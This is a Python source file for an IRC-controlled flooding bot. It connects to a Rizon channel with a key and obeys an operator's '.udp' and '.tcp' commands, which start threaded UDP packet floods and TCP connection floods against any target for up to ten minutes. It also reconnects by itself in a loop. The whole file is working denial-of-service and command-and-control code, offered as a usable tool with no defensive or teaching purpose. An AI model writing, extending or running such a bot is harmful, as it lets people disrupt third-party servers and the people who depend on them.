#!/usr/bin/env python3
# file: bot.py
# IRC bot — Rizon, #nxp-ops, threaded flood commands

import socket
import time
import threading

# ---- config ----
IRC_HOST = "irc.rizon.net"
IRC_PORT = 6667
IRC_NICK = "testbot001"
IRC_CHAN = "#nxp-ops"
IRC_KEY  = "Numaanxp123"
OPERATOR = "yourtest"            # your nick on Rizon

def irc_send(sock, line):
    try:
        sock.sendall((line + "\r\n").encode("utf-8"))
    except Exception as e:
        print(f"[send err] {e}")

def udp_flood(sock, target, port, duration):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\xff" * 1024
    end = time.time() + duration
    sent = 0
    try:
        while time.time() < end:
            try:
                s.sendto(payload, (target, port))
                sent += 1
            except Exception:
                pass
    finally:
        s.close()
    irc_send(sock, f"PRIVMSG {IRC_CHAN} :udp done — {sent} packets to {target}:{port}")

def tcp_flood(sock, target, port, duration):
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.close()
            sent += 1
        except Exception:
            pass
    irc_send(sock, f"PRIVMSG {IRC_CHAN} :tcp done — {sent} connects to {target}:{port}")

def run_once():
    sock = socket.create_connection((IRC_HOST, IRC_PORT), timeout=15)
    sock.settimeout(None)
    print(f"[+] connected to {IRC_HOST}:{IRC_PORT}")

    irc_send(sock, f"NICK {IRC_NICK}")
    irc_send(sock, f"USER {IRC_NICK} 0 * :bot")

    buf = b""
    registered = False

    while True:
        try:
            data = sock.recv(4096)
        except Exception as e:
            print(f"[recv err] {e}")
            return
        if not data:
            print("[!] connection closed")
            return

        buf += data
        while b"\r\n" in buf:
            line, buf = buf.split(b"\r\n", 1)
            text = line.decode("utf-8", "replace")
            print(f"<< {text}")

            if text.startswith("PING "):
                irc_send(sock, f"PONG {text[5:]}")
                continue

            if (" 376 " in text or " 422 " in text) and not registered:
                registered = True
                time.sleep(1)
                irc_send(sock, f"JOIN {IRC_CHAN} {IRC_KEY}")
                continue

            if " PRIVMSG " not in text:
                continue

            parts = text.split(" ", 3)
            if len(parts) < 4:
                continue

            sender = parts[0].lstrip(":").split("!")[0]
            target = parts[2]
            msg    = parts[3].lstrip(":")

            if target != IRC_CHAN:
                continue
            if sender != OPERATOR:
                continue

            print(f"[cmd] {sender}: {msg}")

            if msg.startswith(".ping"):
                irc_send(sock, f"PRIVMSG {IRC_CHAN} :pong from {IRC_NICK}")

            elif msg.startswith(".echo "):
                irc_send(sock, f"PRIVMSG {IRC_CHAN} :{msg[6:].strip()}")

            elif msg.startswith(".die"):
                irc_send(sock, "QUIT :bye")
                sock.close()
                return

            elif msg.startswith(".udp "):
                try:
                    _, t, p, d = msg.split()
                    irc_send(sock, f"PRIVMSG {IRC_CHAN} :udp flood {t}:{p} for {d}s")
                    threading.Thread(
                        target=udp_flood,
                        args=(sock, t, int(p), min(int(d), 600)),
                        daemon=True
                    ).start()
                except Exception as e:
                    irc_send(sock, f"PRIVMSG {IRC_CHAN} :bad args: {e}")

            elif msg.startswith(".tcp "):
                try:
                    _, t, p, d = msg.split()
                    irc_send(sock, f"PRIVMSG {IRC_CHAN} :tcp flood {t}:{p} for {d}s")
                    threading.Thread(
                        target=tcp_flood,
                        args=(sock, t, int(p), min(int(d), 600)),
                        daemon=True
                    ).start()
                except Exception as e:
                    irc_send(sock, f"PRIVMSG {IRC_CHAN} :bad args: {e}")

def main():
    while True:
        try:
            run_once()
        except Exception as e:
            print(f"[!] error: {e}")
        print("[+] reconnecting in 10s")
        time.sleep(10)

if __name__ == "__main__":
    main()
